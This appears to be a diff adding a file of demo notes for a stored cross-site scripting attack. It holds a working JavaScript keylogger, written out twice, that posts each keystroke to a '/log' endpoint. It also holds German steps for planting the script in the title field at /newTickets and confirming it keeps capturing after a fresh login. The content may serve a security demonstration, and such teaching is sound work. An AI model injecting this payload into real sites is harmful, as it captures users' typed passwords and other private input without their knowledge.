@@ -1,0 +1,30 @@
+<script>
+document.addEventListener('keydown', function(e){
+  fetch('/log', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({key: e.key})
+  });
+});
+</script>
+
+
+
+
+<script>
+document.addEventListener('keydown', function(e){
+  fetch('/log', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({key: e.key})
+  });
+});
+</script>
+
+
+Bei Vorführung:
+
+1. Aus DB Zeile löschen mit XSS Keylogger
+2. keylog.txt löschen für neues file.
+3. in title feld einfügen bei /newTickets
+4. Neuer Browser oder Inkoknito Tab --> Anmelden und keylogger sollte weiterhin aktiv sein !!!
